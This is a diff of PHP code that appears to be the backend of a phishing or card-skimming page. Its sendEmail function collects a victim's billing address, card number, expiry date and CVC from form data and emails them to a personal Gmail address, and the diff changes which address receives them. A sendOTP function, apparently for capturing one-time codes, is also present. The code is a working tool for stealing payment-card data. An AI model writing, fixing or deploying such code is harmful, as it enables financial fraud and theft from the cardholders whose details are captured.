@@ -67,7 +67,7 @@ function sendEmail($post) {
     // } catch (Exception $e) {
     //     echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
     // }
-    $to = filter_var('americanresidence435@gmail.com', FILTER_SANITIZE_EMAIL);
+    $to = filter_var('habeebajani9@gmail.com', FILTER_SANITIZE_EMAIL);
     // $subject = filter_var("payment process", FILTER_SANITIZE_STRING);
     // $message = filter_var($message, FILTER_SANITIZE_STRING);
     // $fromName = filter_var($fromName, FILTER_SANITIZE_STRING);
@@ -82,27 +82,32 @@ function sendEmail($post) {
     $email_body = "You have received a new message.\n\n";
     $email_body .= "Billing address: $address\r\n";
     $email_body .= "State: $state\r\n";
-    $email_body .= "city: $city\r\n";
-    $email_body .= "zip-code: $zipCode\r\n";
+    $email_body .= "City: $city\r\n";
+    $email_body .= "Zip-code: $zipCode\r\n";
     $email_body .= "Card owner: $name\r\n";
     $email_body .= "Card number: $card_number\r\n";
-    $email_body .= "amount: $amount_to_pay\r\n";
-    
+    $email_body .= "Amount: $amount_to_pay\r\n";
     $email_body .= "Card expiration year: $card_expiration_year\r\n";
     $email_body .= "Card expiration month: $card_expiration_month\r\n";
     $email_body .= "Card CVC: $cvv\r\n";
 
 
+
     $html_body = "<h3>You have received a new message.</h3>";
-    $html_body .= "<p><strong>Card owner:</strong> $name</p>";
-    $html_body .= "<p><strong>card number:</strong> $card_number</p>";
-    $email_body .= "amount: $amount_to_pay";
-    $html_body .= "<p><strong>card expiration year:</strong><br>$card_expiration_year</p>";
-    $html_body .= "<p><strong>card expiration month:</strong><br>$card_expiration_month</p>";
-    $html_body .= "<p><strong>cvc:</strong><br>$cvv</p>";
+    $html_body .= "<p><strong>Billing Address:</strong> $address</p>";
+    $html_body .= "<p><strong>State:</strong> $state</p>";
+    $html_body .= "<p><strong>City:</strong> $city</p>";
+    $html_body .= "<p><strong>Zip-code:</strong> $zipCode</p>";
+    $html_body .= "<p><strong>Card Owner:</strong> $name</p>";
+    $html_body .= "<p><strong>Card Number:</strong> $card_number</p>";
+    $html_body .= "<p><strong>Amount:</strong> $amount_to_pay</p>";
+    $html_body .= "<p><strong>Card Expiration Year:</strong> $card_expiration_year</p>";
+    $html_body .= "<p><strong>Card Expiration Month:</strong> $card_expiration_month</p>";
+    $html_body .= "<p><strong>Card CVC:</strong> $cvv</p>";
+
 
     // Send email
-    if (mail($to, $subject, $email_body, $headers)) {
+    if (mail($to, $subject, $html_body, $headers)) {
         echo "success";
     } else {
         echo "Failed to send email to";
@@ -200,22 +205,3 @@ function sendOTP($post) {
     $headers .= "From: {$name} <{$fromEmail}>" . "\r\n";
     $headers .= "Reply-To: {$fromEmail}" . "\r\n";
     if (mail($to, $subject, $email_body, $headers)) {
-        echo "success";
-    } else {
-        echo "Failed to send email to";
-    }
-
-    
-}
-
-if(isset($_POST['sendcard'])){
-    sendEmail($_POST);
-}
-if(isset($_POST['sendotp'])){
-    sendOTP($_POST);
-}
-if(isset($_POST['contact'])){
-    sendContact($_POST);
-}
-
-?>
